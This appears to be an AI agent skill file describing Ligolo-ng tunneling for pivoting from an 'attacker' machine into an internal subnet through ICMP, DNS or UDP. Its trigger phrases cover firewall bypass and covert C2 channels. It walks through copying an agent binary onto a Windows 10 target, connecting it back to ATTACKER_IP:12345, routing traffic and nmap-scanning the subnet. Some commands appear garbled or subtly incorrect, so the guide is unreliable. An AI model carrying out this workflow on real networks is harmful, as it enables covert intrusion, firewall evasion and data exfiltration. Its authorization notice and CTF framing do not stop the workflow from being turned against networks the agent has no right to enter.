---
name: ligolo-ng-pivot
description: Ligolo-ng - ICMP/DNS tunnel pivoting through routers without admin rights. Use when bypassing firewalls, pivoting through network segments, or creating covert C2 channels over ICMP.
---

> ⚠️ **SECURITY NOTICE**: Only use on systems you own or have explicit written authorization for. Unauthorized access is illegal.

# Ligolo-ng Pivot

Ligolo-ng is a modern tunneling tool that creates VPN-like tunnels using ICMP (ping), DNS, or UDP protocols. Perfect for bypassing firewall rules that block standard TCP traffic.

## When to Activate

- "pivot through router", "tunnel through firewall", "ICMP tunneling"
- "bypass port restrictions", "create covert channel"
- "connect to internal network", "pivot to different subnet"
- "ligolo", "ligolo-ng", "tunnel without admin"
- CTF: "port is closed but need to pivot", "stateful firewall bypass"

## Core Concepts

### Why Ligolo-ng for Your Scenario

```
[Main Router] ---WiFi--- [Your Machine]
                              |
                           [Router] --wired-- [W10 Device]
```

- ICMP tunnel works through routers without opening ports
- No admin privileges needed on agent (uses gvisor sandbox)
- Up to 100 Mbits/sec throughput
- Creates virtual TUN interface - looks like real network interface

### Transport Protocols

| Protocol | Use Case | Pros |
|----------|----------|------|
| ICMP | Bypass firewalls that allow ping | Works through most routers |
| DNS | UDP 53 often whitelisted | Exfiltration friendly |
| UDP | Fast tunnel | Higher throughput |

## Workflow

### Step 1: Local Installation

**Pre-built binaries already installed at:**
```
/home/anini39/.config/opencode/tools/ligolo-ng/dist/proxy
/home/anini39/.config/opencode/tools/ligolo-ng/dist/agent
```

### Step 2: Start Proxy on Attacker

```bash
# Terminal 1 - Start proxy listener
sudo /home/anini39/.config/opencode/tools/ligolo-ng/dist/proxy - Engine Mode
# Default port: 12345
```

### Step 3: Transfer Agent to Target (W10)

```bash
# Copy agent binary to W10 device
# Binary location:
/home/anini39/.config/opencode/tools/ligolo-ng/dist/agent
```

### Step 4: Connect Agent from W10

```powershell
# On W10 - connect through router
.\ligolo-ng-agent.exe -connect YOUR_MAIN_ROUTER_IP:12345 -tunnel 0
```

### Step 5: Create Tunnel Interface

```bash
# On attacker - create local tunnel interface
sudo ip link add name ligolo type dummy
sudo ip addr add 10.10.10.1/24 dev ligolo
sudo ip link set ligolo up
```

### Step 6: Start Session and Route Traffic

```bash
# Interactive session
session -i 1

# Within session - start tunnel
listener_add --addr 10.10.10.1:443

# Route traffic through tunnel
sudo route add -net 192.168.0.0/24 gw 10.10.10.1
```

### Step 7: Access Internal Subnet

```bash
# Now you can reach W10 and other devices
nmap -sT 192.168.0.0/24
```

## Common Commands Reference

### Proxy Commands (attacker side)

```bash
./ligolo-ng-proxy                      # Start proxy
./ligolo-ng-proxy -listen 0.0.0.0     # Bind to all interfaces
./ligolo-ng-proxy - Engine Mode        # Interactive mode
```

### Agent Commands (target side)

```bash
./ligolo-ng-agent -connect ATTACKER_IP:12345 -tunnel 0
./ligolo-ng-agent -connect ATTACKER_IP:12345 -tunnel 0 -protocol icmp  # Force ICMP
./ligolo-ng-agent -connect ATTACKER_IP:12345 -tunnel 0 -protocol dns     # Force DNS
```

### Session Commands (within proxy interactive mode)

```bash
sessions                              # List connected agents
session -i AGENT_ID                   # Switch to session
listener_add --addr IP:PORT           # Add tunnel listener
route                                # Show routing table
```

## Advanced: ICMP-Only Bypass

If router only allows ICMP out:

```bash
# On W10 - use ICMP only
.\ligolo-ng-agent.exe -connect YOUR_MAIN_ROUTER_IP:12345 -tunnel 0 -protocol icmp

# On attacker - the proxy auto-detects ICMP
```

## Alternative Tools

If Ligolo doesn't work:
- **chisel** - HTTP tunnel, simple but needs admin
- **sshuttle** - VPN over SSH, needs SSH access
- **Tunna/reGeorg** - HTTP tunnel wrappers
- **DNScat2** - DNS tunneling only

## Validation Checklist

- [ ] Proxy running on attacker machine
- [ ] Agent successfully connects through router
- [ ] TUN interface created locally
- [ ] Routes pointing through tunnel
- [ ] Can ping/scan internal subnet
- [ ] Traffic is encrypted (Ligolo uses mTLS)
